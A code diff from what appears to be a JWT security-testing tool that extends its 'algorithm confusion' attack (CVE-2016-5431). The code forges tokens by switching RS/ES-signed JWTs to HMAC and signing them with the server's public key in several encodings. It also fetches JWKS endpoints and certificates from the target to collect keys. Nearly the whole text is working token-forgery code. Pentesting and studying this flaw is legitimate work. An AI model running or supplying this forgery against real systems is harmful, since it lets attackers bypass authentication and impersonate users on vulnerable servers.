@@ -29,18 +29,51 @@ function isAsymmetricAlg(alg: string): boolean {
   return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
 }
 
-function publicKeyPemToSecret(keyPem: string, originalAlg: string): Buffer {
-  if (originalAlg.startsWith("ES")) {
-    return ecPublicKeyPemToRawBytes(keyPem);
-  }
-  return publicKeyPemToRawBytes(keyPem);
+interface SecretVariant {
+  secret: Buffer;
+  label: string;
+}
+
+// The HMAC secret for algorithm confusion is whatever byte string the server
+// passes to its HMAC verify function. In the overwhelmingly common vulnerable
+// pattern the server hands its *PEM-encoded public key string* to the verifier,
+// so the secret is the PEM text itself — NOT its decoded DER bytes (the old bug).
+//
+// Because the exact bytes the server uses can vary (trailing newline, the
+// base64(PEM) form produced by the Burp/PortSwigger "k" workflow, or — rarely —
+// raw DER), we emit one signed token per plausible secret encoding.
+function secretVariants(keyPem: string, originalAlg: string): SecretVariant[] {
+  const pem = keyPem.replace(/\r\n/g, "\n");            // normalize CRLF → LF
+  const pemNoTrailingLF = pem.replace(/\n+$/, "");
+  const pemBase64 = Buffer.from(pem, "utf8").toString("base64");
+
+  const variants: SecretVariant[] = [
+    // Primary: the PEM string exactly as a typical key file / JWK→PEM export
+    // (64-char wrapped, trailing newline). This is the net result of the
+    // "base64-encode the PEM into a symmetric JWK `k`, then sign" workflow,
+    // because `k` is base64-decoded back to the PEM before HMAC.
+    { secret: Buffer.from(pem, "utf8"), label: "PEM" },
+    // Some servers strip / lack the trailing newline.
+    { secret: Buffer.from(pemNoTrailingLF, "utf8"), label: "PEM (no trailing LF)" },
+    // Literal base64(PEM) — for tools/servers that use the `k` value undecoded.
+    { secret: Buffer.from(pemBase64, "utf8"), label: "base64(PEM)" },
+    // Raw DER bytes — the previous behavior, kept only as a last-resort fallback.
+    {
+      secret: originalAlg.startsWith("ES")
+        ? ecPublicKeyPemToRawBytes(pem)
+        : publicKeyPemToRawBytes(pem),
+      label: "DER",
+    },
+  ];
+  return variants;
 }
 
 function makeAttack(
   parsed: ParsedJWT,
   hmacAlg: "HS256" | "HS384" | "HS512",
-  publicKeyPem: string,
-  sourceDesc: string
+  secret: Buffer,
+  sourceDesc: string,
+  variantLabel: string
 ): AttackResult {
   const header = { ...parsed.header, alg: hmacAlg };
   delete header.jku;
@@ -49,21 +82,42 @@ function makeAttack(
   delete header.x5c;
   delete header.kid;
 
-  const secret = publicKeyPemToSecret(publicKeyPem, parsed.header.alg as string);
   const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
 
   return {
     id: nanoid(),
     technique: "algConfusion",
-    techniqueName: `Algorithm Confusion (${parsed.header.alg} → ${hmacAlg}, ${sourceDesc})`,
+    techniqueName: `Algorithm Confusion (${parsed.header.alg} → ${hmacAlg}, ${variantLabel})`,
     description:
       `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's ` +
-      `RSA/EC public key (${sourceDesc}) as the HMAC secret. ` +
-      "Vulnerable servers using the same key object for both RS/ES and HS verification " +
-      "will accept this token.",
+      `public key (${sourceDesc}) as the HMAC secret, encoded as ${variantLabel}. ` +
+      "Vulnerable servers that use the same key material for both RS/ES and HS " +
+      "verification will accept this token.",
     modifiedJWT: jwt,
     timestamp: Date.now(),
   };
+}
+
+// Expand a single public-key PEM into one attack per secret-encoding variant,
+// de-duplicating identical signed tokens via the shared `seen` set.
+function attacksForKey(
+  parsed: ParsedJWT,
+  hmacAlg: "HS256" | "HS384" | "HS512",
+  originalAlg: string,
+  keyPem: string,
+  sourceDesc: string,
+  seen: Set<string>
+): AttackResult[] {
+  const out: AttackResult[] = [];
+  for (const v of secretVariants(keyPem, originalAlg)) {
+    try {
+      const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
+      if (seen.has(attack.modifiedJWT)) continue;
+      seen.add(attack.modifiedJWT);
+      out.push(attack);
+    } catch { /* skip invalid keys */ }
+  }
+  return out;
 }
 
 // Build alg-confusion attacks for an explicit set of public-key PEMs (e.g. keys
@@ -76,11 +130,10 @@ export function buildAlgConfusionForKeys(
   const originalAlg = parsed.header.alg as string;
   if (!isAsymmetricAlg(originalAlg)) return [];
   const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  const seen = new Set<string>();
   const out: AttackResult[] = [];
   for (const pem of keyPems) {
-    try {
-      out.push(makeAttack(parsed, hmacAlg, pem, sourceDesc));
-    } catch { /* skip invalid keys */ }
+    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
   }
   return out;
 }
@@ -89,7 +142,11 @@ export interface DiscoveryInfo {
   url: string;
   source: "JWKS endpoint" | "certificate" | "public-key";
   keyCount: number;
+  content: string;   // raw body returned by the URL
+  pems: string[];    // PEM-encoded public keys extracted from it
 }
+
+const MAX_DISCOVERY_CONTENT = 16384; // cap raw body sent to the UI
 
 export async function buildAlgConfusionAttacks(
   parsed: ParsedJWT,
@@ -106,13 +163,10 @@ export async function buildAlgConfusionAttacks(
 
   const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
   const results: AttackResult[] = [];
+  const seen = new Set<string>();
 
   const addKey = (pem: string, source: string) => {
-    try {
-      results.push(makeAttack(parsed, hmacAlg, pem, source));
-    } catch {
-      // Skip invalid keys
-    }
+    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
   };
 
   // 1. Explicitly configured key / cert
@@ -173,7 +227,13 @@ export async function buildAlgConfusionAttacks(
           addKey(pem, `JWKS (${result.url})`);
         }
         // Surface the discovered JWKS endpoint so the analyst doesn't miss it.
-        onDiscovery?.({ url: result.url, source: "JWKS endpoint", keyCount: pems.length });
+        onDiscovery?.({
+          url: result.url,
+          source: "JWKS endpoint",
+          keyCount: pems.length,
+          content: result.content.slice(0, MAX_DISCOVERY_CONTENT),
+          pems,
+        });
       }
     } catch { /* ignore */ }
 
@@ -182,7 +242,13 @@ export async function buildAlgConfusionAttacks(
       const keys = await discoverPublicKeys(fetcher, baseUrl);
       for (const k of keys) {
         addKey(k.publicKeyPem, `${k.kind} at ${k.url}`);
-        onDiscovery?.({ url: k.url, source: k.kind, keyCount: 1 });
+        onDiscovery?.({
+          url: k.url,
+          source: k.kind,
+          keyCount: 1,
+          content: k.content.slice(0, MAX_DISCOVERY_CONTENT),
+          pems: [k.publicKeyPem],
+        });
       }
     } catch { /* ignore */ }
   }
